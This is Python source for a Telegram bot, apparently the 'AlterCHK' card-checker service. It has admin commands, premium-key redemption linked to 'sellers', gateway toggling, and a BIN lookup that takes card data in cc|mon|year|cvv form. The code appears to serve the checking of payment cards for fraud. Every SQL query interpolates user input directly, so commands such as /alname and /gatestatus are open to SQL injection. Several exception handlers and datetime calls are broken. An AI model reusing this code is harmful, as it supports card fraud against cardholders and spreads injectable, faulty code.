                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                if len(result) != 0 : return UserIDUP
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            await ConnectDB.run_query(f"UPDATE pruebas SET UserBanned='No' WHERE ID='{CaptureData}'")
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE UNBANNED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nUserID: <code>{CaptureData}</code>\nBanned: <code>No</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["alreset"])
async def CMDalreset(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    async def CaptureData() :
        try :
            Separador = message.text
            UserIDUP = re.sub("[^0-9-]", "", Separador)
            try :
                result = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{UserIDUP}'")
                if len(result) != 0 : return UserIDUP
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{CaptureData}'")
        await ConnectDB.run_query(f"UPDATE pruebas SET TimeAntiSpam='90', Creditos='0', TimeAntiSpam='90', Status='Free User', UserBanned='No' WHERE ID='{CaptureData}'")
        one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
        repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
        if (CaptureData.find('-') >= 0) :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE RESET ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nChatID: <code>{CaptureData}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        else :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE RESET ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nUserID: <code>{CaptureData}</code>\nStatus: <code>Free User</code>\nCredits: <code>0 credit(s)</code>\nAntiSpam: <code>90s</code>\nWarnings: <code>0</code> | Banned: <code>No</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["alname"])
async def CMDalname(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    yourmessageone = message.text[8:]
    async def CaptureData() :
        try :
            Separador = yourmessageone.split("|")
            UserIDUP = Separador[0]
            NewStatus = Separador[1]
            try :
                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                if len(result) != 0 : return UserIDUP, NewStatus
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            await ConnectDB.run_query(f"UPDATE pruebas SET Status='{CaptureData[1]}' WHERE ID='{CaptureData[0]}'")
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE UPDATE ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nUserID: <code>{CaptureData[0]}</code>\nNewStatus: <code>{CaptureData[1]}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["account"])
async def CMDalname(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    async def CaptureData() :
        try :
            Separador = message.text
            UserIDUP = re.sub("[^0-9-]", "", Separador)
            try :
                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                if len(result) != 0 : return UserIDUP
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        CheckPremium = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{CaptureData}'")
        try:
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{CaptureData}'")
            result = json.loads(json.dumps(result[0]))
        except IndexError:
                fechasinformato = datetime.now()
                UserSince = fechasinformato.strftime("%d-%m-%Y")
                await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{CaptureData}', '{UserSince}')")
                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{CaptureData}'")
                result = json.loads(json.dumps(result[0]))
        if len(CheckPremium) != 0 :
            resultprm = json.loads(json.dumps(CheckPremium[0]))
            NextBilling =  resultprm['NextBilling']
            FormatBilling =  resultprm['FormatBilling']
            UserID = result['ID']
            Status = result['Status']
            Creditos  = result['Creditos']

            birthdate = datetime.datetime.strptime(FormatBilling,'%Y-%m-%d')
            currentDate = datetime.datetime.today()

            remaining_days = (birthdate - currentDate).days
            #print(f"{birthdate} - {currentDate} = {remaining_days}")
            if (int(remaining_days) == 0) or (int(remaining_days) == -1): remaining_days = 'Today'
            elif (int(remaining_days) == 1) : remaining_days = '1 day'
            else :
                remaining_days = int(remaining_days) + 1
                remaining_days = f'{remaining_days} days'
            myaccountmsg = f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Status: <code>{Status}</code>\n↯ NextBilling: <code>{NextBilling}</code> | ↯ Expired in: <code>{remaining_days}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n- - - - - - - - - - - - - - - - - - - - -</b>"
        else :
            UserID = result['ID']
            Status = result['Status']
            Creditos  = result['Creditos']
            UserSince = result['UserSince']
            myaccountmsg = f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Status: <code>{Status}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ UserSince: <code>{UserSince}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>"
        try :
            await bot.send_message(chat_id=message.chat.id, text=myaccountmsg, reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["id"])
async def CMDalname(message: types.Message):
    try :
        await bot.send_message(chat_id=message.chat.id, text=f"<code>{message.chat.id}</code>", reply_to_message_id=message.message_id)
        return
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
        return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["reedem", "claim", "redeem"])
async def CMDreedem(message: types.Message):
    from datetime import datetime, timedelta, date
    import pytz
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError:
            fechasinformato = datetime.now()
            UserSince = fechasinformato.strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))

    VerMessage = re.sub("[^0-9a-zA-Z-]", "", message.text[7:])
    if not VerMessage:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>↯ [ INVALID KEY ] ↯</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return        
    await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if VerMessage:
        try:
            result =  await ConnectDB.run_query(f"SELECT * FROM keysalter WHERE KeyAlter='{VerMessage}'")
            result = json.loads(json.dumps(result[0]))
            Used = result['Used']
            UsersAlloweds = result['UsersAlloweds']
            Days = result['Days']
            Credits_key = result['Credits']
        except IndexError :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>↯ [ This is not a valid key. ] ↯</b>", reply_to_message_id=message.message_id)
                return 
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        async def CaptureData() :
            try :
                UserIDUP = message.from_user.id
                DaysAdded = Days
                try :
                    Credits_user = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
                    Credits_user = json.loads(json.dumps(Credits_user[0]))['Creditos']
                    Credits = int(Credits_key) + int(Credits_user)
                    
                    result = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{UserIDUP}'")
                    if len(result) != 0 :
                        if int(len(str(UserIDUP))) >= 8 :
                            if DaysAdded: return "UPDATE", UserIDUP, DaysAdded, Credits
                    elif len(result) == 0 :
                        if int(len(str(UserIDUP))) >= 8 :
                            if DaysAdded: return "INSERT", UserIDUP, DaysAdded, Credits
                except IndexError : None
            except IndexError : None
        CaptureData = await CaptureData()
        if not CaptureData:
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        result =  await ConnectDB.run_query(f"SELECT * FROM keysalter WHERE KeyAlter='{VerMessage}'")
        Used = json.loads(json.dumps(result[0]))['Used']
        NewUsed = 1 + int(Used)
        await ConnectDB.run_query(f"UPDATE keysalter SET Used='{NewUsed}' WHERE KeyAlter='{VerMessage}'")

        if int(UsersAlloweds) > int(Used):

            FormatBilling = date.today() + timedelta(days=int(CaptureData[2]))
            Fechasinformato = datetime.now(pytz.timezone('US/Central'))
            NextBilling = Fechasinformato + timedelta(days=int(CaptureData[2]))
            NextBilling = NextBilling.strftime("%d-%m-%Y %H:%M:%S")

            if CaptureData[0] == 'INSERT':
                from datetime import datetime, timedelta, date
                import pytz
                await ConnectDB.run_query(f"INSERT INTO userpremium (ID, FormatBilling, NextBilling) VALUES ('{CaptureData[1]}','{FormatBilling}','{NextBilling}')")
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Premium' , TimeAntiSpam='35', Creditos='{CaptureData[3]}' WHERE ID='{CaptureData[1]}'")

                result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{CaptureData[1]}'")
                result = json.loads(json.dumps(result[0]))
                UserStatus   =  result['Status']
                Credits      =  result['Creditos']
                TimeAntiSpam =  result['TimeAntiSpam']
                Warnings     =  result['Warnings']
                UserBanned   =  result['UserBanned']

                one = InlineKeyboardButton('𝘼𝙡𝙩𝙚𝙧𝘾𝙃𝙆 𝙋𝙧𝙞𝙘𝙚𝙨', url="https://t.me/alterchkreferencias/13")
                two = InlineKeyboardButton('𝘼𝙡𝙩𝙚𝙧𝘾𝙃𝙆 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨/𝙎𝙚𝙡𝙡𝙚𝙧𝙨', url="https://t.me/alterchkreferencias/12")
                try :
                    language = message.from_user.language_code
                    lenguage_code = language[0:2].lower()
                except TypeError:
                    translate = 'You can purchase a subscription of alterchkbot by clicking on the button below. ⬇'
                else :
                    translate = await Translate(lenguage_code,'You can purchase a subscription of alterchkbot by clicking on the button below. ⬇')

                remaining_days = (datetime.strptime(str(FormatBilling),'%Y-%m-%d') - datetime.today()).days
                if (int(remaining_days) == 0) or (int(remaining_days) == -1): remaining_days = 'Today'
                elif (int(remaining_days) == 1) : remaining_days = '1 day'
                else : remaining_days = f'{int(remaining_days) + 1} days'

                repmarkup = InlineKeyboardMarkup(row_width=2).add(one).add(two)

                if message.chat.id == CaptureData[1] :
                    try :
                        await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ NextBilling ↯ <code>{NextBilling}</code> | ↯ Expired in ↯ <code>{remaining_days}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{translate}\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_markup=repmarkup, reply_to_message_id=message.message_id)
                        await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Reedem(UserID): <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code></b>")
                    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
                else :
                    try :
                        await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ NextBilling ↯ <code>{NextBilling}</code> | ↯ Expired in ↯ <code>{remaining_days}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code></b>", reply_to_message_id=message.message_id)
                        await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Reedem(UserID): <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code></b>")

                        await bot.send_message(chat_id=CaptureData[1], text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{translate}\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_markup=repmarkup)
                    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
                    except ErrorsAiogram.utils.exceptions.ChatNotFound: print("ERROR AL ENVIAR EL LINK")

            elif CaptureData[0] == 'UPDATE' :
                from datetime import datetime, timedelta, date
                import pytz
                await ConnectDB.run_query(f"UPDATE userpremium SET FormatBilling='{FormatBilling}', NextBilling='{NextBilling}' WHERE ID='{CaptureData[1]}'")
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Premium' , TimeAntiSpam='35', Creditos='{CaptureData[3]}' WHERE ID='{CaptureData[1]}'")

                result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{CaptureData[1]}'")
                result = json.loads(json.dumps(result[0]))
                UserStatus   =  result['Status']
                Credits      =  result['Creditos']
                TimeAntiSpam =  result['TimeAntiSpam']
                Warnings     =  result['Warnings']
                UserBanned   =  result['UserBanned']

                one = InlineKeyboardButton('𝘼𝙡𝙩𝙚𝙧𝘾𝙃𝙆 𝙋𝙧𝙞𝙘𝙚𝙨', url="https://t.me/alterchkreferencias/13")
                two = InlineKeyboardButton('𝘼𝙡𝙩𝙚𝙧𝘾𝙃𝙆 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨/𝙎𝙚𝙡𝙡𝙚𝙧𝙨', url="https://t.me/alterchkreferencias/12")
                try :
                    language = message.from_user.language_code
                    lenguage_code = language[0:2].lower()
                except TypeError:
                    translate = 'You can purchase a subscription of alterchkbot by clicking on the button below. ⬇'
                else :
                    translate = await Translate(lenguage_code,'You can purchase a subscription of alterchkbot by clicking on the button below. ⬇')

                remaining_days = (datetime.strptime(str(FormatBilling),'%Y-%m-%d') - datetime.today()).days
                if (int(remaining_days) == 0) or (int(remaining_days) == -1): remaining_days = 'Today'
                elif (int(remaining_days) == 1) : remaining_days = '1 day'
                else : remaining_days = f'{int(remaining_days) + 1} days'

                repmarkup = InlineKeyboardMarkup(row_width=2).add(one).add(two)

                if message.chat.id == CaptureData[1] :
                    try :
                        await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ NextBilling ↯ <code>{NextBilling}</code> | ↯ Expired in ↯ <code>{remaining_days}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{translate}\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_markup=repmarkup, reply_to_message_id=message.message_id)
                        await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Reedem(UserID): <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code></b>")
                    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
                else :
                    try :
                        await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ NextBilling ↯ <code>{NextBilling}</code> | ↯ Expired in ↯ <code>{remaining_days}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code></b>", reply_to_message_id=message.message_id)
                        await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Reedem(UserID): <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code></b>")

                        await bot.send_message(chat_id=CaptureData[1], text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{translate}\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_markup=repmarkup)
                    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
                    except ErrorsAiogram.utils.exceptions.ChatNotFound: print("ERROR AL ENVIAR EL LINK")
        else :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>↯ [ THIS KEY HAS EXPIRED ] ↯</b>", reply_to_message_id=message.message_id)
            except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["gatestatus"])
async def CMDgatestatus(message: types.Message):
    AccessSTAFF = await AccessModerator(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    yourmessageone = message.text[12:]
    async def CaptureData() :
        try :
            Separador = yourmessageone.split("|")
            Gate = Separador[0]
            NewStatus = Separador[1]
            try :
                MessageMain = Separador[2]
            except IndexError : MessageMain = None
            try :
                result = await Validator(str(Gate))
                if result != '' :
                    ListaCC = ['OFF','ON']
                    CheckingList = NewStatus in ListaCC
                    if CheckingList == True :
                        if MessageMain: MessageMaintenance = MessageMain
                        else : MessageMaintenance = 'No comment added'
                        return Gate, NewStatus, MessageMaintenance, result
            except KeyError : None
        except IndexError : None
    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        from datetime import datetime
        import pytz 

        now = datetime.now(pytz.timezone('US/Central'))
        fecha_actual = now.strftime(f"%d-%m-%Y %H:%M:%S %p")
        if CaptureData[1] == 'ON' :
            Status = 'ONLINE ✅'
            LinesStatus = '✅ SUCCESSF. ACTIVED ✅'
        elif CaptureData[1] == 'OFF' :
            Status = 'OFFLINE ❌'
            LinesStatus = '🚫 SUCCESSF. DEACTIVED 🚫'

        await ConnectDB.run_query(f"UPDATE Gateways SET Status='{Status}', Mensaje='{CaptureData[2]}', DateOFF='{fecha_actual}' WHERE Name='{CaptureData[0]}'")
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{LinesStatus}\n- - - - - - - - - - - - - - - - - - - - -\n↯ ⚠️ Gate [ {CaptureData[0]} ] has entered the [ {CaptureData[1]} ] state.\n↯ 🔰 Comment added: </b>{CaptureData[2]}\n<b>↯ 📮 Date added:</b> {fecha_actual}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["bin"])
async def CMDreedem(message: types.Message):
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('bin')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBIN LOOKUP\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if int(len(re.sub("[^0-9]", "", message.text)))>=6:
        VerMessage = message.text
    elif message.reply_to_message: VerMessage = message.reply_to_message.text
    else : VerMessage = message.text

    try: 
        if not re.sub("[^0-9]", "", VerMessage) :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBIN LOOKUP\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>xxxxxx</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
    except TypeError:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBIN LOOKUP\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>xxxxxx</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
